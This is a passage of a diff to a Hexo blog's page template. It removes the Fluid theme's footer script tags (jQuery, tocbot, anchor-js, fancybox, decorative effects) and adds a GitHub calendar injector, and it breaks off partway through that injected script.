-      NProgress.done();
-    })
-  </script>
-
-
-<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
-<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
-
-
-  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var subtitle = document.getElementById('subtitle');
-      if (!subtitle || !typing) {
-        return;
-      }
-      var text = subtitle.getAttribute('data-typed-text');
-      
-        typing(text);
-      
-    })(window, document);
-  </script>
-
-
-
-
-
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
-    var toc = jQuery('#toc');
-    if (toc.length === 0 || !window.tocbot) { return; }
-    var boardCtn = jQuery('#board-ctn');
-    var boardTop = boardCtn.offset().top;
-
-    window.tocbot.init(Object.assign({
-      tocSelector     : '#toc-body',
-      contentSelector : '.markdown-body',
-      linkClass       : 'tocbot-link',
-      activeLinkClass : 'tocbot-active-link',
-      listClass       : 'tocbot-list',
-      isCollapsedClass: 'tocbot-is-collapsed',
-      collapsibleClass: 'tocbot-is-collapsible',
-      scrollSmooth    : true,
-      includeTitleTags: true,
-      headingsOffset  : -boardTop,
-    }, CONFIG.toc));
-    if (toc.find('.toc-list-item').length > 0) {
-      toc.css('visibility', 'visible');
-    }
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('tocbot' in window) {
-        tocbot.refresh();
-        var toc = jQuery('#toc');
-        if (toc.length === 0 || !tocbot) {
-          return;
-        }
-        if (toc.find('.toc-list-item').length > 0) {
-          toc.css('visibility', 'visible');
-        }
-      }
-    });
-  });
-</script>
-
-
-  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
-
-  <script>Fluid.plugins.codeWidget();</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
-    window.anchors.options = {
-      placement: CONFIG.anchorjs.placement,
-      visible  : CONFIG.anchorjs.visible
-    };
-    if (CONFIG.anchorjs.icon) {
-      window.anchors.options.icon = CONFIG.anchorjs.icon;
-    }
-    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-    var res = [];
-    for (var item of el) {
-      res.push('.markdown-body > ' + item.trim());
-    }
-    if (CONFIG.anchorjs.placement === 'left') {
-      window.anchors.options.class = 'anchorjs-link-left';
-    }
-    window.anchors.add(res.join(', '));
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('anchors' in window) {
-        anchors.removeAll();
-        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-        var res = [];
-        for (var item of el) {
-          res.push('.markdown-body > ' + item.trim());
-        }
-        if (CONFIG.anchorjs.placement === 'left') {
-          anchors.options.class = 'anchorjs-link-left';
-        }
-        anchors.add(res.join(', '));
-      }
-    });
-  });
-</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
-    Fluid.plugins.fancyBox();
-  });
-</script>
-
-
-  <script>Fluid.plugins.imageCaption();</script>
-
-  <script defer src="/js/leancloud.js" ></script>
-
-  <script  src="/js/local-search.js" ></script>
-
-
-
-
-  
-<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/xiantiao.js"></script>
-<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/love.js"></script>
-<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/caidai.js"></script>
-
-
-
-<!-- 主题的启动项，将它保持在最底部 -->
-<!-- the boot of the theme, keep it at the bottom -->
-<script  src="/js/boot.js" ></script>
-
-
-  
-
-  <noscript>
-    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
-  </noscript>
 <!-- hexo injector body_end start -->
   <script data-pjax src="https://cdn.jsdelivr.net/gh/Zfour/hexo-github-calendar@1.21/hexo_githubcalendar.js"></script>
   <script data-pjax>
